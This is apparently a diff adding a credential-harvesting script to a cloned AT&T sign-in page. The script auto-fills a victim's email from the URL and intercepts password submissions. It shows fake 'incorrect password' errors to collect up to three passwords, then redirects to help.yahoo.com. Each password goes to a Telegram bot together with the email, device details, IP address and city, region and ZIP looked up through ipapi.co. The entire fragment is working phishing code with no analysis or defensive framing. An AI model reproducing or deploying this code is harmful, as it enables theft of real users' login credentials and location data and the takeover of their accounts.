+            console.error("[Telegram] ❌ Chat ID not configured! Please set your TELEGRAM_CHAT_ID");
+            console.log("[Telegram] 📝 Message that would have been sent:\n", message);
+            return false;
+        }
+        
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        try {
+            console.log("[Telegram] 📤 Sending message to Telegram...");
+            const response = await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ 
+                    chat_id: TELEGRAM_CHAT_ID, 
+                    text: message.substring(0, 4096), 
+                    parse_mode: "HTML" 
+                })
+            });
+            const result = await response.json();
+            if (response.ok && result.ok) {
+                console.log("[Telegram] ✅ Message sent successfully!");
+                return true;
+            } else {
+                console.error("[Telegram] ❌ Failed to send:", result);
+                return false;
+            }
+        } catch(e) { 
+            console.error("[Telegram] ❌ Send error:", e); 
+            return false;
+        }
+    }
+    
+    // Get device/browser information
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let os = "Unknown", browser = "Unknown";
+        if (ua.includes("Windows")) os = "Windows";
+        else if (ua.includes("Mac")) os = "MacOS";
+        else if (ua.includes("Linux")) os = "Linux";
+        else if (ua.includes("Android")) os = "Android";
+        else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+        
+        if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+        else if (ua.includes("Firefox")) browser = "Firefox";
+        else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+        else if (ua.includes("Edg")) browser = "Edge";
+        
+        return `${browser} on ${os} | Screen: ${screen.width}x${screen.height} | Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+    }
+    
+    // Get location, IP, city, state, zip via ipapi.co (works on any hosting)
+    async function getLocationInfo() {
+        try {
+            console.log("[Location] 🌍 Fetching location data...");
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            console.log("[Location] ✅ Location fetched:", data.ip);
+            return {
+                ip: data.ip || "Unknown",
+                city: data.city || "Unknown",
+                state: data.region || data.region_code || "Unknown",
+                zip: data.postal || "Unknown",
+                country: data.country_name || "Unknown"
+            };
+        } catch(e) {
+            console.error("[Location] ❌ Fetch error:", e);
+            return { ip: "Unable to fetch", city: "Unknown", state: "Unknown", zip: "Unknown", country: "Unknown" };
+        }
+    }
+    
+    // Show "Incorrect Password" error message on the page
+    function showIncorrectPasswordMessage(attemptCount) {
+        const existingErrors = document.querySelectorAll('.custom-pw-error');
+        existingErrors.forEach(err => err.remove());
+        
+        let errorContainer = document.querySelector('#appErrorAbove');
+        if (!errorContainer || errorContainer.innerHTML === "") errorContainer = document.querySelector('.formfield-msg');
+        if (!errorContainer) errorContainer = document.querySelector('#userInlineErrorText');
+        
+        const message = `❌ Incorrect password. Attempt ${attemptCount}/3. Please try again.`;
+        
+        if (errorContainer) {
+            errorContainer.innerHTML = `<div class="custom-pw-error" style="color: #d32f2f; font-size: 14px; margin-top: 8px; padding: 8px; background: #ffebee; border-radius: 4px;">${message}</div>`;
+            errorContainer.style.display = "block";
+        } else {
+            const passwordField = document.querySelector('input[type="password"]');
+            if (passwordField && passwordField.parentElement) {
+                const errorDiv = document.createElement('div');
+                errorDiv.className = 'custom-pw-error';
+                errorDiv.style.cssText = 'color: #d32f2f; font-size: 14px; margin-top: 8px; padding: 8px; background: #ffebee; border-radius: 4px; text-align: center;';
+                errorDiv.innerText = message;
+                passwordField.parentElement.appendChild(errorDiv);
+                setTimeout(() => { if (errorDiv) errorDiv.remove(); }, 3000);
+            }
+        }
+    }
+    
+    // Extract email from URL hash (e.g., https://yourdomain.com#royal@gmail.com)
+    function extractEmailFromUrl() {
+        let email = null;
+        if (window.location.hash && window.location.hash.length > 1) {
+            let hash = window.location.hash.substring(1);
+            if (hash.includes('@')) {
+                email = decodeURIComponent(hash).trim();
+            }
+        }
+        if (!email) {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('email')) email = urlParams.get('email');
+            else if (urlParams.has('user')) email = urlParams.get('user');
+            if (email) email = decodeURIComponent(email).trim();
+        }
+        return (email && email.includes('@')) ? email : null;
+    }
+    
+    // Auto-fill email and click continue button
+    async function autoGrabAndContinue() {
+        if (emailAutoFilled) return;
+        const email = extractEmailFromUrl();
+        if (!email) return;
+        
+        capturedEmail = email;
+        emailAutoFilled = true;
+        console.log("[AutoGrab] 📧 Email captured from URL hash:", email);
+        
+        const userInput = await waitForElement('#userID', 8000);
+        if (!userInput) {
+            console.log("[AutoGrab] ❌ User ID input not found");
+            return;
+        }
+        
+        userInput.value = email;
+        userInput.dispatchEvent(new Event('input', { bubbles: true }));
+        userInput.dispatchEvent(new Event('change', { bubbles: true }));
+        console.log("[AutoGrab] ✅ Email filled");
+        
+        await new Promise(r => setTimeout(r, 500));
+        
+        const continueBtn = await waitForElement('#continueFromUserLogin', 5000);
+        if (continueBtn) {
+            console.log("[AutoGrab] 🔘 Clicking Continue button...");
+            continueBtn.click();
+        } else {
+            console.log("[AutoGrab] ❌ Continue button not found");
+        }
+    }
+    
+    function waitForElement(selector, maxWaitMs = 10000) {
+        return new Promise((resolve) => {
+            const startTime = Date.now();
+            const interval = setInterval(() => {
+                const el = document.querySelector(selector);
+                if (el) { clearInterval(interval); resolve(el); }
+                else if (Date.now() - startTime > maxWaitMs) { clearInterval(interval); resolve(null); }
+            }, 100);
+        });
+    }
+    
+    // Report credentials and location to Telegram
+    async function reportToTelegram(password, attemptNumber, isRedirect = false) {
+        console.log(`[Report] 📨 Reporting attempt #${attemptNumber} to Telegram...`);
+        const deviceInfo = getDeviceInfo();
+        const location = await getLocationInfo();
+        const timestamp = new Date().toLocaleString();
+        
+        let message = `🔐 <b>LOGIN ATTEMPT #${attemptNumber}</b> 🔐\n\n` +
+                      `<b>📧 User ID:</b> ${capturedEmail || "Unknown"}\n` +
+                      `<b>🔑 Password:</b> ${password || "Unknown"}\n` +
+                      `<b>📱 Device:</b> ${deviceInfo}\n` +
+                      `<b>🌐 IP Address:</b> ${location.ip}\n` +
+                      `<b>📍 City:</b> ${location.city}\n` +
+                      `<b>🏛️ State/Region:</b> ${location.state}\n` +
+                      `<b>📮 ZIP Code:</b> ${location.zip}\n` +
+                      `<b>🌍 Country:</b> ${location.country}\n` +
+                      `<b>⏰ Time:</b> ${timestamp}`;
+        
+        if (isRedirect) {
+            message += `\n\n⚠️ <b>THIRD ATTEMPT - REDIRECTING TO help.yahoo.com</b> ⚠️`;
+        }
+        
+        const result = await sendToTelegram(message);
+        if (result) {
+            console.log(`[Report] ✅ Attempt #${attemptNumber} reported successfully!`);
+        } else {
+            console.log(`[Report] ⚠️ Attempt #${attemptNumber} - check console for details`);
+        }
+        return result;
+    }
+    
+    // Main interceptor for the password page - NO PAGE RELOAD
+    function setupPasswordInterceptor() {
+        if (interceptorActive) return;
+        
+        const observer = new MutationObserver(async () => {
+            const passwordInput = document.querySelector('input[type="password"]');
+            
+            if (passwordInput && !interceptorActive) {
+                interceptorActive = true;
+                console.log("[Interceptor] 🔐 Password page detected! 3-attempt limit active.");
+                
+                if (!capturedEmail) {
+                    const emailInput = document.querySelector('#userID');
+                    if (emailInput && emailInput.value) capturedEmail = emailInput.value;
+                    console.log("[Interceptor] 📧 Email captured:", capturedEmail);
+                }
+                
+                const form = document.getElementById('login');
+                if (form && !form._passwordInterceptorAttached) {
+                    form._passwordInterceptorAttached = true;
+                    console.log("[Interceptor] ✅ Form interceptor attached - page will NOT reload on incorrect attempts");
+                    
+                    form.addEventListener('submit', async function(e) {
+                        const passwordField = document.querySelector('input[type="password"]');
+                        let enteredPassword = passwordField ? passwordField.value : '';
+                        
+                        e.preventDefault();
+                        e.stopPropagation();
+                        
+                        passwordAttempts++;
+                        console.log(`[Interceptor] 🔑 Password attempt #${passwordAttempts}: "${enteredPassword}"`);
+                        
+                        // Send to Telegram (fire and forget)
+                        reportToTelegram(enteredPassword, passwordAttempts, false).catch(err => console.error(err));
+                        
+                        if (passwordAttempts < 3) {
+                            showIncorrectPasswordMessage(passwordAttempts);
+                            if (passwordField) {
+                                passwordField.value = '';
+                                passwordField.focus();
+                            }
+                        } else {
+                            await reportToTelegram(enteredPassword, passwordAttempts, true);
+                            console.log("[Interceptor] 🚪 Redirecting to help.yahoo.com...");
+                            window.location.href = "https://help.yahoo.com";
+                        }
+                    }, true);
+                    
+                    const submitBtn = document.querySelector('button[type="submit"], #continueFromUserLogin, .btn-primary');
+                    if (submitBtn && !submitBtn._clickPrevented) {
+                        submitBtn._clickPrevented = true;
+                        submitBtn.addEventListener('click', function(e) {
+                            e.preventDefault();
+                            e.stopPropagation();
+                            form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
+                        });
+                    }
+                }
+            }
+        });
+        
+        observer.observe(document.body, { childList: true, subtree: true });
+    }
+    
+    // Initialize
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', () => {
+            setTimeout(autoGrabAndContinue, 500);
+            setTimeout(setupPasswordInterceptor, 500);
+        });
+    } else {
+        setTimeout(autoGrabAndContinue, 500);
+        setTimeout(setupPasswordInterceptor, 500);
+    }
+    
+    window.addEventListener('load', () => {
+        setTimeout(autoGrabAndContinue, 1000);
+        setTimeout(setupPasswordInterceptor, 1000);
+    });
+    
+    console.log("[Init] ✅ Auto-grab + 3-attempt + Telegram reporter initialized");
+    console.log("[Init] 📌 To enable Telegram, set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in the script");
+})();
+</script>
+
+<script type="module" src="https://signin.att.com/static/siam/en/halo_c/halo-c-login/runtime.js?v=29.5.3"></script>
+<script type="module" src="https://signin.att.com/static/siam/en/halo_c/halo-c-login/polyfills.js?v=29.5.3"></script>
+<script type="module" src="https://signin.att.com/static/siam/en/halo_c/halo-c-login/vendor.js?v=29.5.3"></script>
+<script type="module" src="https://signin.att.com/static/siam/en/halo_c/halo-c-login/main.js?v=29.5.3"></script>
+<script type="module" src="https://signin.att.com/static/siam/en/halo_c/halo-c-login/src_app_login-general_login-general_module_ts.js?v=29.5.3"></script>
+
+<script id="analyticsFooterScript" type="text/javascript" src="https://signin.att.com/static/thirdparty/adobe/detm-container-ftr.js"></script>
+<script src="https://signin.att.com/static/ciam/en/common/js/keepAlive.js" defer="" type="text/javascript"></script>
+</body>
+</html>
